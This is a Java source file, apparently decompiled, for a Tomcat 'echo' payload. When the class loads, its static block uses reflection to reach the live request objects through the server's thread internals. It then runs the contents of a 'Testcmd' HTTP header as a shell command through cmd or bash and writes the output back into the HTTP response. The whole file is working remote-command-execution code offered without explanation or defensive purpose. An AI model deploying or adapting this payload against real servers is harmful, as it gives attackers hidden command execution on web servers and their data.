//package org.apache.coyote.taglib.core;
package echo;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.List;

public class TomcatEchoPayload2 {
    public static String CMD_HEADER = "Testcmd";

    public TomcatEchoPayload2() {
    }

    public static ByteArrayOutputStream q(String var0) {
        return execCmd(var0);
    }

    static {
        try {
            boolean var0 = false;
            ThreadGroup var1 = Thread.currentThread().getThreadGroup();
            ClassLoader var2 = Thread.currentThread().getContextClassLoader();
            Field var3 = var1.getClass().getDeclaredField("threads");
            var3.setAccessible(true);
            Thread[] var4 = (Thread[])((Thread[])var3.get(var1));

            for(int var5 = 0; var5 < var4.length; ++var5) {
                try {
                    Thread var6 = var4[var5];
                    if (var6 != null) {
                        String var7 = var6.getName();
                        if (!var7.contains("exec") && var7.contains("http")) {
                            var3 = var6.getClass().getDeclaredField("target");
                            var3.setAccessible(true);
                            Object var8 = var3.get(var6);
                            if (var8 instanceof Runnable) {
                                var3 = var8.getClass().getDeclaredField("this$0");
                                var3.setAccessible(true);
                                var8 = var3.get(var8);

                                try {
                                    var3 = var8.getClass().getDeclaredField("handler");
                                } catch (NoSuchFieldException var19) {
                                    var3 = var8.getClass().getSuperclass().getSuperclass().getDeclaredField("handler");
                                }

                                var3.setAccessible(true);
                                var8 = var3.get(var8);

                                try {
                                    var3 = var8.getClass().getSuperclass().getDeclaredField("global");
                                } catch (NoSuchFieldException var18) {
                                    var3 = var8.getClass().getDeclaredField("global");
                                }

                                var3.setAccessible(true);
                                var8 = var3.get(var8);
                                var3 = var8.getClass().getDeclaredField("processors");
                                var3.setAccessible(true);
                                List var9 = (List)((List)var3.get(var8));

                                for(int var10 = 0; var10 < var9.size(); ++var10) {
                                    Object var11 = var9.get(var10);
                                    var3 = var11.getClass().getDeclaredField("req");
                                    var3.setAccessible(true);
                                    Object var12 = var3.get(var11);
                                    Object var13 = var12.getClass().getMethod("getResponse").invoke(var12);
                                    var7 = (String)var12.getClass().getMethod("getHeader", String.class).invoke(var12, CMD_HEADER);
                                    if (var7 != null && !var7.isEmpty()) {
                                        var13.getClass().getMethod("setStatus", Integer.TYPE).invoke(var13, new Integer(200));
                                        ByteArrayOutputStream var14 = q(var7);

                                        try {
                                            Class var15 = Class.forName("org.apache.tomcat.util.buf.ByteChunk", false, var2);
                                            var8 = var15.newInstance();
                                            var15.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(var8, var14.toByteArray(), new Integer(0), var14.toByteArray().length);
                                            var13.getClass().getMethod("doWrite", var15).invoke(var13, var8);
                                        } catch (NoSuchMethodException var17) {
                                            Class var16 = Class.forName("java.nio.ByteBuffer", false, var2);
                                            var8 = var16.getDeclaredMethod("wrap", byte[].class).invoke(var16, var14.toByteArray());
                                            var13.getClass().getMethod("doWrite", var16).invoke(var13, var8);
                                        }

                                        var0 = true;
                                    }

                                    if (var0) {
                                        break;
                                    }
                                }

                                if (var0) {
                                    break;
                                }
                            }
                        }
                    }
                } catch (Exception var20) {
                }
            }
        } catch (Exception var21) {
        }

    }

    public static ByteArrayOutputStream execCmd(String var0) {
        try {
            if (var0 != null && !var0.isEmpty()) {
                String[] var1 = null;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    var1 = new String[]{"cmd", "/c", var0};
                } else {
                    var1 = new String[]{"/bin/bash", "-c", var0};
                }

                InputStream var2 = Runtime.getRuntime().exec(var1).getInputStream();
                ByteArrayOutputStream var3 = new ByteArrayOutputStream();
                boolean var4 = false;
                byte[] var5 = new byte[1024];

                int var8;
                while((var8 = var2.read(var5)) != -1) {
                    var3.write(var5, 0, var8);
                }

                return var3;
            }
        } catch (Exception var7) {
        }

        return null;
    }
}

